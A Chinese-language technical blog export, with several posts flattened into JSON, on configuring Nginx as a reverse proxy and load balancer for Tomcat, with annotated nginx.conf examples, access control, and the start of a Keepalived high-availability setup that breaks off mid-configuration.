下载nginx启动脚本这个我全部放到github上面，nginx启动脚本 启动关闭nginx 123456789101112131415161718## 检查配置文件是否正确# /usr/local/nginx-1.6/sbin/nginx -t # ./sbin/nginx -V # 可以看到编译选项## 启动、关闭# ./sbin/nginx # 默认配置文件 conf/nginx.conf，-c 指定# ./sbin/nginx -s stop或 pkill nginx#nginx平滑重启、nginx -t -c /usr/local/nginx/conf/nginx.conf## 重启，不会改变启动时指定的配置文件# ./sbin/nginx -s reload或 kill -HUP `cat /usr/local/nginx-1.6/logs/nginx.pid` 设置开机启动chkconfig --level 345 nginx on chkconfig nginx on chkconfig nginx --list nginx 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 当然也可以将 nginx 作为系统服务管理，下载 nginx 到/etc/init.d/，修改里面的路径然后赋予可执行权限。 1# service nginx &#123;start|stop|status|restart|reload|configtest&#125; nginx.conf配置文件Nginx配置文件主要分成四部分：main（全局设置）、server（主机设置）、upstream（上游服务器设置，主要为反向代理、负载均衡相关配置）和 location（URL匹配特定位置后的设置），每部分包含若干个指令。main部分设置的指令将影响其它所有部分的设置；server部分的指令主要用于指定虚拟主机域名、IP和端口；upstream的指令用于设置一系列的后端服务器，设置反向代理及后端服务器的负载均衡；location部分用于匹配网页位置（比如，根目录“/”,“/images”,等等）。他们之间的关系式：server继承main，location继承server；upstream既不会继承指令也不会被继承。它有自己的特殊指令，不需要在其他地方的应用。 当前nginx支持的几个指令上下文： 2.1 通用下面的nginx.conf简单的实现nginx在前端做反向代理服务器的例子，处理js、png等静态文件，jsp等动态请求转发到其它服务器tomcat： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120user www www;worker_processes 2;worker_cpu_affinity 00000001; error_log /var/log/nginx/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;pid /var/run/nginx.pid;worker_rlimit_nofile 1024;events &#123; use epoll; worker_connections 65535;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #access_log logs/access.log main; sendfile on; # tcp_nopush on; keepalive_timeout 65; # gzip压缩功能设置 gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.0; gzip_comp_level 6; gzip_types text/html text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml; gzip_vary on; # http_proxy 设置 client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 75; proxy_send_timeout 75; proxy_read_timeout 75; proxy_buffer_size 4k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; proxy_temp_file_write_size 64k; proxy_temp_path /usr/local/nginx/proxy_temp 1 2; # 设定负载均衡后台服务器列表 upstream backend &#123; #ip_hash; server 192.168.10.100:8080 max_fails=2 fail_timeout=30s ; server 192.168.10.101:8080 max_fails=2 fail_timeout=30s ; &#125; # 很重要的虚拟主机配置 server &#123; listen 80; server_name itoatest.example.com; root /apps/oaapp; charset utf-8; access_log logs/host.access.log main; #对 / 所有做负载均衡+反向代理 location / &#123; root /apps/oaapp; index index.jsp index.html index.htm; proxy_pass http://backend; proxy_redirect off; # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; &#125; #静态文件，nginx自己处理，不去backend请求tomcat location ~* /download/ &#123; root /apps/oa/fs; &#125; location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ &#123; root /apps/oaapp; expires 7d; &#125; location /nginx_status &#123; stub_status on; access_log off; allow 192.168.10.0/24; deny all; &#125; location ~ ^/(WEB-INF)/ &#123; deny all; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125; ## 其它虚拟主机，server 指令开始&#125; 这里我整理了一份每个含义的详解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152#定义Nginx运行的用户和用户user www www;#nginx进程数，建议设置为等于CPU总核心数。这里我服务器4核worker_processes 4;#一个1核CPU对应一个进程数管理。这样能很好分配资源。worker_cpu_affinity 00000001 00000010 00000100 00001000; #全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]error_log /var/log/nginx/error.log info;#进程文件pid /var/run/nginx.pid;#一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（系统的值ulimit -n）与nginx进程数相除，但是nginx分配请求并不均匀，所以建议与ulimit -n的值保持一致。worker_rlimit_nofile 65535;#工作模式与连接数上限events&#123;#参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型，如果跑在FreeBSD上面，就用kqueue模型。use epoll;#单个进程最大连接数（最大连接数=连接数*进程数）worker_connections 65535;&#125;#设定http服务器http&#123;include mime.types; #文件扩展名与文件类型映射表default_type application/octet-stream; #默认文件类型#charset utf-8; #默认编码server_names_hash_bucket_size 128; #服务器名字的hash表大小client_header_buffer_size 32k; #上传文件大小限制large_client_header_buffers 4 64k; #设定请求缓client_max_body_size 8m; #设定请求缓sendfile on; #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。autoindex on; #开启目录列表访问，合适下载服务器，默认关闭。tcp_nopush on; #防止网络阻塞tcp_nodelay on; #防止网络阻塞keepalive_timeout 120; #长连接超时时间，单位是秒#keepalive 超时时间，客户端到服务端的连接持续有效时间当出现对服务器后，继续请求时keepalive_timeout功能可避免建立或者重新。#FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout 300;fastcgi_buffer_size 64k;fastcgi_buffers 4 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;#gzip模块设置gzip on; #开启gzip压缩输出gzip_min_length 1k; #最小压缩文件大小gzip_buffers 4 16k; #压缩缓冲区gzip_http_version 1.0; #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）gzip_comp_level 2; #压缩等级gzip_types text/plain application/x-javascript text/css application/xml;#压缩类型，默认就已经包含text/html，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。gzip_vary on;#limit_zone crawler $binary_remote_addr 10m; #开启限制IP连接数的时候需要使用upstream blog.kern.com &#123;#upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。 server 192.168.58.139:80 weight=1 max_fails=2 fail_timeout=30s; server 192.168.58.140:80 weight=1 max_fails=2 fail_timeout=30s;&#125;#虚拟主机的配置 server&#123;#监听端口 listen 80;#域名可以有多个，用空格隔开 server_name www.ihaozhuo.com ; ##(服务器名) index index.html index.htm index.php; root /data/www/ha97; location ~ .*\\.(php|php5)?$&#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi.conf;&#125;#图片缓存时间设置location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$&#123;expires 10d;&#125;#JS和CSS缓存时间设置location ~ .*\\.(js|css)?$&#123;expires 1h;&#125;#日志格式设定log_format access '$remote_addr - $remote_user [$time_local] \"$request\" ''$status $body_bytes_sent \"$http_referer\" ''\"$http_user_agent\" $http_x_forwarded_for';#定义本虚拟主机的访问日志access_log /var/log/nginx/ha97access.log access;#对 \"/\" 启用反向代理location / &#123;proxy_pass http://127.0.0.1:88;proxy_cache cache_one; #开启缓存proxy_cache_valid 200 304 7d; #正常状态缓存，因为头像不经常改动所以缓存7天proxy_redirect off;proxy_set_header X-Real-IP $remote_addr;#后端的Web服务器可以通过X-Forwarded-For获取用户真实IPproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#以下是一些反向代理的配置，可选。proxy_set_header Host $host;client_max_body_size 10m; #允许客户端请求的最大单文件字节数client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数，proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时)proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时)proxy_read_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时)proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的设置proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2）proxy_temp_file_write_size 64k;#设定缓存文件夹大小，大于这个值，将从upstream服务器传&#125;#设定查看Nginx状态的地址location /NginxStatus &#123;stub_status on;access_log on;auth_basic \"NginxStatus\";auth_basic_user_file conf/htpasswd;#htpasswd文件的内容可以用apache提供的htpasswd工具来产生。&#125;#本地动静分离反向代理配置#所有jsp的页面均交由tomcat或resin处理location ~ .(jsp|jspx|do)?$ &#123;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_pass http://127.0.0.1:8080;&#125;#所有静态文件由nginx直接读取不经过tomcat或resinlocation ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|pdf|xls|mp3|wma)$&#123; expires 15d; &#125;location ~ .*.(js|css)?$&#123; expires 1h; &#125;&#125;&#125;","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"Nginx+Tomcat实现负载均衡设置访问控制","slug":"Web服务技术/Nginx/Nginx+Tomcat实现负载均衡设置访问控制","date":"2016-05-23T09:25:23.000Z","updated":"2017-03-31T10:56:59.000Z","comments":true,"path":"2016/05/23/Web服务技术/Nginx/Nginx+Tomcat实现负载均衡设置访问控制/","link":"","permalink":"http://blog.yangcvo.me/2016/05/23/Web服务技术/Nginx/Nginx+Tomcat实现负载均衡设置访问控制/","excerpt":"","text":"Nginx+Tomcat实现负载均衡设置访问控制一、环境准备 Tomcat1：10.11.155.26 Tomcat2：10.11.155.41 Nginx：192.168.31.154 在26和41上分别部署相同的Tomcat程序，修改index.jsp页面，把内容改为各自的IP地址. 二、修改配置文件nginx.confNginx负载均衡，其实主要就是用upstream、server指令，再配以权重等等参数。如果为了让nginx支持session共享，还需要额外增加一个模块。 一、Nginx负载均衡 在http{…}中配置一个upstream{…}，参考如下：引用 upstream tomcat-account { server 10.11.155.26:8080 weight=1; server 10.11.155.41:8080 weight=1; } 接着修改location节点，配置代理： 引用 1234567891011121314151617181920212223242526272829server &#123; listen 80; server_name 10001.test.intranet; location / &#123; index index.html index.php index.jsp index.htm; proxy_pass http://tomcat-account; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;``` 这里可以写自己的内网域名也可以写IP.当访问根路径时，会轮播路由到两台服务器上，至于后端服务器是tomcat还是jetty之类的，都无所谓，照葫芦画瓢就是了。当然，有的机器性能好，或者负载低，可以承担高负荷访问量，可以通过权重（weight），提升访问频率。数值越高，被分配到的请求数越多。#### 1、weight（权重）指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。如下所示，10.0.0.88的访问比率要比10.0.0.77的访问比率高一倍。```bashupstream linuxidc&#123; server 10.11.155.26 weight=5; server 10.11.155.41 weight=10; &#125; 2、ip_hash（访问ip）每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。 12345upstream favresin&#123; ip_hash; server 10.11.155.26:8080; server 10.11.155.41:8080; &#125; 3、fair（第三方）按后端服务器的响应时间来分配请求，响应时间短的优先分配。与weight分配策略类似。 12345upstream favresin&#123; server 10.11.155.26:8080; server 10.11.155.41:8080; fair; &#125; server指令参数如下： 12345- weight ——权重，数值越大，分得的请求数就越多，默认值为1。- max_fails ——对访问失败的后端服务器尝试访问的次数。默认值为1，当设置为0时将关闭检查。- fail_timeout——失效超时时间，当多次访问失败后，对该节点暂停访问。- down——标记服务器为永久离线状态，用于ip_hash指令。- backup——仅当非backup服务器全部宕机或繁忙时启用。 例如，可以这样配置： 引用 upstream tomcat { server 10.11.155.26:8080 weight=5; server 10.11.155.41:8080 weight=10; } 后者分得的请求数就会较高。 详细点的负载均衡配置nginx.conf:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133user www;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;error_log /opt/logs/nginx/error.log crit;# pid /usr/local/nginx/nginx.pid;pid /var/run/nginx.pid;worker_rlimit_nofile 1024;events &#123; use epoll; worker_connections 65535;&#125;#设定http服务器，利用它的反向代理功能提供负载均衡支持http &#123; #设定mime类型,类型由mime.type文件定义 include /etc/nginx/mime.types; default_type application/octet-stream; #access_log logs/access.log main; server_names_hash_bucket_size 128; client_header_buffer_size 32k; large_client_header_buffers 4 32k; sendfile on; tcp_nopush on; tcp_nodelay on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; log_format access '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #设定日志格式 access_log /var/log/nginx/access.log; server &#123; listen 80; server_name localhost; location / &#123; root html; index index.html index.htm; limit_req zone=one; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125; #省略上文有的一些配置节点 #。。。。。。。。。。 #设定负载均衡的服务器列表 upstream tomcat-account &#123; #weigth参数表示权值，权值越高被分配到的几率越大 server 192.168.8.1x:3128 weight=5; #本机上的Squid开启3128端口,不是必须要squid server 192.168.8.2x:80 weight=1; server 192.168.8.3x:80 weight=6; &#125; upstream mysvr2 &#123; #weigth参数表示权值，权值越高被分配到的几率越大 server 192.168.8.x:80 weight=1; server 192.168.8.x:80 weight=6; &#125; #第一个虚拟服务器 server &#123; #侦听192.168.8.x的80端口 listen 80; server_name 192.168.8.x; #对aspx后缀的进行负载均衡请求 location ~ .*.aspx$ &#123; #定义服务器的默认网站根目录位置 root /root; #定义首页索引文件的名称 index index.php index.html index.htm; #请求转向mysvr 定义的服务器列表 proxy_pass http://tomcat-account; #以下是一些反向代理的配置可删除.所以可以按nginx+tomcat 做负载均衡即可。 proxy_redirect off; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #允许客户端请求的最大单文件字节数 client_max_body_size 10m; #缓冲区代理缓冲用户端请求的最大字节数， client_body_buffer_size 128k; #nginx跟后端服务器连接超时时间(代理连接超时) proxy_connect_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时) proxy_read_timeout 90; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffer_size 4k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置 proxy_buffers 4 32k; #高负荷下缓冲大小（proxy_buffers*2） proxy_busy_buffers_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传 proxy_temp_file_write_size 64k; &#125; &#125;&#125; 常用指令说明123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899nginx在运行时与具体业务功能（比如http服务或者email服务代理）无关的一些参数，比如工作进程数，运行的身份等。woker_processes 2在配置文件的顶级main部分，worker角色的工作进程的个数，master进程是接收并分配请求给worker处理。这个数值简单一点可以设置为cpu的核数grep ^processor /proc/cpuinfo | wc -l，也是 auto 值，如果开启了ssl和gzip更应该设置成与逻辑CPU数量一样甚至为2倍，可以减少I/O操作。如果nginx服务器还有其它服务，可以考虑适当减少。worker_cpu_affinity也是写在main部分。在高并发情况下，通过设置cpu粘性来降低由于多CPU核切换造成的寄存器等现场重建带来的性能损耗。如worker_cpu_affinity 0001 0010 0100 1000; （四核）。worker_connections 2048写在events部分。每一个worker进程能并发处理（发起）的最大连接数（包含与客户端或后端被代理服务器间等所有连接数）。nginx作为反向代理服务器，计算公式 最大连接数 = worker_processes * worker_connections/4，所以这里客户端最大连接数是1024，这个可以增到到8192都没关系，看情况而定，但不能超过后面的worker_rlimit_nofile。当nginx作为http服务器时，计算公式里面是除以2。worker_rlimit_nofile 10240写在main部分。默认是没有设置，可以限制为操作系统最大的限制65535。use epoll写在events部分。在Linux操作系统下，nginx默认使用epoll事件模型，得益于此，nginx在Linux操作系统下效率相当高。同时Nginx在OpenBSD或FreeBSD操作系统上采用类似于epoll的高效事件模型kqueue。在操作系统不支持这些高效模型时才使用select。2.2.2 http服务器与提供http服务相关的一些配置参数。例如：是否使用keepalive啊，是否使用gzip进行压缩等。sendfile on开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，减少用户空间到内核空间的上下文切换。对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。keepalive_timeout 65 : 长连接超时时间，单位是秒，这个参数很敏感，涉及浏览器的种类、后端服务器的超时设置、操作系统的设置，可以另外起一片文章了。长连接请求大量小文件的时候，可以减少重建连接的开销，但假如有大文件上传，65s内没上传完成会导致失败。如果设置时间过长，用户又多，长时间保持连接会占用大量资源。send_timeout : 用于指定响应客户端的超时时间。这个超时仅限于两个连接活动之间的时间，如果超过这个时间，客户端没有任何活动，Nginx将会关闭连接。client_max_body_size 10m允许客户端请求的最大单文件字节数。如果有上传较大文件，请设置它的限制值client_body_buffer_size 128k缓冲区代理缓冲用户端请求的最大字节数模块http_proxy：这个模块实现的是nginx作为反向代理服务器的功能，包括缓存功能（另见文章）proxy_connect_timeout 60nginx跟后端服务器连接超时时间(代理连接超时)proxy_read_timeout 60连接成功后，与后端服务器两个成功的响应操作之间超时时间(代理接收超时)proxy_buffer_size 4k设置代理服务器（nginx）从后端realserver读取并保存用户头信息的缓冲区大小，默认与proxy_buffers大小相同，其实可以将这个指令值设的小一点proxy_buffers 4 32kproxy_buffers缓冲区，nginx针对单个连接缓存来自后端realserver的响应，网页平均在32k以下的话，这样设置proxy_busy_buffers_size 64k高负荷下缓冲大小（proxy_buffers*2）proxy_max_temp_file_size当 proxy_buffers 放不下后端服务器的响应内容时，会将一部分保存到硬盘的临时文件中，这个值用来设置最大临时文件大小，默认1024M，它与 proxy_cache 没有关系。大于这个值，将从upstream服务器传回。设置为0禁用。proxy_temp_file_write_size 64k当缓存被代理的服务器响应到临时文件时，这个选项限制每次写临时文件的大小。proxy_temp_path（可以在编译的时候）指定写到哪那个目录。proxy_pass，proxy_redirect见 location 部分。模块http_gzip：gzip on : 开启gzip压缩输出，减少网络传输。gzip_min_length 1k ： 设置允许压缩的页面最小字节数，页面字节数从header头得content-length中进行获取。默认值是20。建议设置成大于1k的字节数，小于1k可能会越压越大。gzip_buffers 4 16k ： 设置系统获取几个单位的缓存用于存储gzip的压缩结果数据流。4 16k代表以16k为单位，安装原始数据大小以16k为单位的4倍申请内存。gzip_http_version 1.0 ： 用于识别 http 协议的版本，早期的浏览器不支持 Gzip 压缩，用户就会看到乱码，所以为了支持前期版本加上了这个选项，如果你用了 Nginx 的反向代理并期望也启用 Gzip 压缩的话，由于末端通信是 http/1.0，故请设置为 1.0。gzip_comp_level 6 ： gzip压缩比，1压缩比最小处理速度最快，9压缩比最大但处理速度最慢(传输快但比较消耗cpu)gzip_types ：匹配mime类型进行压缩，无论是否指定,”text/html”类型总是会被压缩的。gzip_proxied any ： Nginx作为反向代理的时候启用，决定开启或者关闭后端服务器返回的结果是否压缩，匹配的前提是后端服务器必须要返回包含”Via”的 header头。gzip_vary on ： 和http头有关系，会在响应头加个 Vary: Accept-Encoding ，可以让前端的缓存服务器缓存经过gzip压缩的页面，例如，用Squid缓存经过Nginx压缩的数据。。2.2.3 server虚拟主机http服务上支持若干虚拟主机。每个虚拟主机一个对应的server配置项，配置项里面包含该虚拟主机相关的配置。在提供mail服务的代理时，也可以建立若干server。每个server通过监听地址或端口来区分。listen监听端口，默认80，小于1024的要以root启动。可以为listen *:80、listen 127.0.0.1:80等形式。server_name服务器名，如localhost、www.example.com，可以通过正则匹配。模块http_stream这个模块通过一个简单的调度算法来实现客户端IP到后端服务器的负载均衡，upstream后接负载均衡器的名字，后端realserver以 host:port options; 方式组织在 &#123;&#125; 中。如果后端被代理的只有一台，也可以直接写在 proxy_pass 。2.2.4 locationhttp服务中，某些特定的URL对应的一系列配置项。root /var/www/html定义服务器的默认网站根目录位置。如果locationURL匹配的是子目录或文件，root没什么作用，一般放在server指令里面或/下。index index.jsp index.html index.htm定义路径下默认访问的文件名，一般跟着root放proxy_pass http:/backend请求转向backend定义的服务器列表，即反向代理，对应upstream负载均衡器。也可以proxy_pass http://ip:port。proxy_redirect off;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;这四个暂且这样设，如果深究的话，每一个都涉及到很复杂的内容，也将通过另一篇文章来解读。 这里我贴出我公司现在Nginx单节点负载均衡代理可以使用下面格式：12345678910111213141516171819202122232425262728293031323334353637383940414243444546http &#123; include mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log /var/log/nginx/access.log; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; server &#123; listen 80; server_name localhost; location / &#123; root html; index index.html index.htm; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125;&#125; upstream sentry &#123; server 120.26.164.217:9000 weight=1; &#125; server &#123; listen 80; server_name sentdy.ihaozhuo.com; location / &#123; index index.html index.php index.jsp index.htm; proxy_pass http://sentry; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;&#125; 访问控制 allow/denyNginx 的访问控制模块默认就会安装，而且写法也非常简单，可以分别有多个allow,deny，允许或禁止某个ip或ip段访问，依次满足任何一个规则就停止往下匹配。如： 12345678910location /nginx-status &#123; stub_status on; access_log off;# auth_basic \"NginxStatus\";# auth_basic_user_file /usr/local/nginx-1.6/htpasswd; allow 192.168.1.100; allow 172.29.73.0/24; deny all;&#125; 我们也常用 httpd-devel 工具的 htpasswd 来为访问的路径设置登录密码： 123456789# htpasswd -c htpasswd adminNew passwd:Re-type new password:Adding password for user admin# htpasswd htpasswd admin //修改admin密码# htpasswd htpasswd sean //多添加一个认证用户这样就生成了默认使用CRYPT加密的密码文件。打开上面nginx-status的两行注释，重启nginx生效。 参考 http://liuqunying.blog.51cto.com/3984207/1420556 http://nginx.org/en/docs/ngx_core_module.html#worker_cpu_affinity http://wiki.nginx.org/HttpCoreModule#sendfile","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"Nginx+Keepalived实现高可用Web负载均衡","slug":"Web服务技术/Nginx/Nginx+Keepalived实现高可用Web负载均衡 ","date":"2016-05-22T09:25:23.000Z","updated":"2017-03-31T10:49:19.000Z","comments":true,"path":"2016/05/22/Web服务技术/Nginx/Nginx+Keepalived实现高可用Web负载均衡 /","link":"","permalink":"http://blog.yangcvo.me/2016/05/22/Web服务技术/Nginx/Nginx+Keepalived实现高可用Web负载均衡 /","excerpt":"","text":"Nginx+Keepalived实现高可用Web负载均衡一、需求场景：通过之前的一篇文章： Nginx+Tomcat实现负载均衡,我们已经能通过Nginx来实现Tomcat应用的负载均衡，但是单个的Nginx会存在单点隐患，如果Nginx挂掉，那么全部的Tomcat应用都将变得不可用，所以实现Nginx的高可用是必不可少的一步。 二、说明 高可用 HA（High Availability），简单讲就是：我某个应用挂了，自动有另外应用起来接着扛着，致使整个服务对外来看是没有中断过的。这里的重点就是不中断，致使公司整个业务能不断进行中，把影响减到最小，赚得更多。 因为要不中断，所以我们就需要用到了 Keepalived。Keepalived 一般不会单独使用，基本都是跟负载均衡软件（LVS、HAProxy、Nginx）一起工作来达到集群的高可用效果。 Keepalived 有双主、主备方案 常用词： 心跳：Master 会主动给 Backup 发送心跳检测包以及对外的网络功能，而 Backup 负责接收 Master 的心跳检测包，随时准备接管主机。为什么叫心跳不知道，但是挺形象的，心跳同步。 选举：Keepalived 配置的时候可以指定各台主机优先级，Master 挂了，各台 Backup 要选举出一个新的 Master。 Keepalived 官网：http://www.keepalived.org/ 官网下载：http://www.keepalived.org/download.html 官网文档：http://www.keepalived.org/documentation.html 三、搭建 软件版本： Nginx：1.8.1 Keepalived：1.2.20 JDK：8u72 Tomcat：8.0.32 部署环境（下文中以第几台来代表这些主机）： 虚拟 IP（VIP）：192.168.1.50 第一台主机：Nginx 1 + Keepalived 1 == 192.168.1.120（Master） 第二台主机：Nginx 2 + Keepalived 2 == 192.168.1.121（Backup) 第三台主机：Tomcat 1 == 192.168.1.122（Web 1） 第四台主机：Tomcat 2 == 192.168.1.123（Web 2） 所有机子进行时间校准：NTP（Network Time Protocol）介绍 第三、第四台主机部署： JDK 的安装：JDK 安装 Tomcat 的安装：Tomcat 安装和配置、优化 第一、二台主机部署（两台部署内容一样）： Nginx 的安装：Nginx 安装和配置 四、Keepalived安装123456789101112131415161718192021222324安装依赖：# sudo yum install -y gcc openssl-devel popt-devel上传或下载 keepalived &amp; 解压包：cd /opt/setups/; # tar zxvf keepalived-1.2.20.tar.gz编译：# cd /opt/setups/keepalived-1.2.20 ; # ./configure --prefix=/usr/local/keepalived编译安装：# make &amp;&amp; make installKeepalived 设置服务和随机启动复制配置文件到启动脚本目录：# cp /usr/program/keepalived/etc/rc.d/init.d/keepalived /etc/init.d/keepalived# cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/# ln -s /usr/local/sbin/keepalived /usr/sbin/# ln -s /usr/local/keepalived/sbin/keepalived /sbin/设置keepalived服务开机启动： # chkconfig keepalived on增加权限# chmod +x /etc/init.d/keepalived Keepalived 配置123456添加环境变量：vim /etc/profileKEEPALIVED_HOME=/usr/local/keepalivedPATH=$PATH:$KEEPALIVED_HOME/sbinexport KEEPALIVED_HOMEexport PATH 刷新环境变量：source /etc/profile 检测环境变量：keepalived -v 123vim /usr/local/keepalived/etc/sysconfig/keepalived把 14 行的：KEEPALIVED_OPTIONS=\"-D\"，改为：KEEPALIVED_OPTIONS=\"-D -f /usr/local/keepalived/etc/keepalived/keepalived.conf\" 第一、二台主机配置（两台在 Keepalived 配置上稍微有不一样）： 123456789健康监测脚本（我个人放在：/opt/bash 目录下）：[nginx_check.sh](Keepalived-Settings/nginx_check.sh)健康监测脚本添加执行权限：chmod 755 /opt/bash/nginx_check.sh运行监测脚本，看下是否有问题：sh /opt/bash/nginx_check.sh，如果没有报错，则表示改脚本没有问题.这个脚本很重要，如果脚本没法用，在启用 Keepalived 的时候可能会报：Keepalived_vrrp[5684]: pid 5959 exited with status 1 nginx 配置（两台一样配置）： 123456789101112131415161718192021222324252627282930worker_processes 1; events &#123; worker_connections 1024; &#125; http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; # （重点） upstream tomcatCluster &#123; server 192.168.1.122:8080 weight=1; server 192.168.1.123:8080 weight=1; &#125; # （重点） server &#123; listen 80; server_name 192.168.1.50; location / &#123; proxy_pass http://tomcatCluster; index index.html index.htm; &#125; &#125; &#125; 4.1 修改keepalived配置文件cat /etc/init.d/keepalived 1234567891011121314151617181920212223242526272829! Configuration File for keepalivedglobal_defs &#123;keepalived 自带的邮件提醒需要开启 sendmail 服务。建议用独立的监控或第三方 SMTProuter_id edu-proxy-01 ## 标识本节点的字条串,通常为 hostname &#125;keepalived 会定时执行脚本并对脚本执行的结果进行分析,动态调整 vrrp_instance 的优先级。如果 脚本执行结果为 0,并且 weight 配置的值大于 0,则优先级相应的增加。如果脚本执行结果非 0,并且 weight 配置的值小于 0,则优先级相应的减少。其他情况,维持原本配置的优先级,即配置文件中 priority 对应 的值。vrrp_script chk_nginx &#123;script \"/etc/keepalived/nginx_check.sh\" interval 2 ## 检测时间间隔weight -20 ## 如果条件成立,权重-20&#125;检测 nginx 状态的脚本路径定义虚拟路由,VI_1 为虚拟路由的标示符,自己定义名称vrrp_instance VI_1 &#123;state MASTER ## 主节点为 MASTER,对应的备份节点为 BACKUPinterface eth1 ## 绑定虚拟 IP 的网络接口,与本机 IP 地址所在的网络接口相同,我的是 eth1 virtual_router_id 51 ## 虚拟路由的 ID 号,两个节点设置必须一样,可选 IP 最后一段使用, 相同的 VRID 为一个组,他将决定多播的 MAC 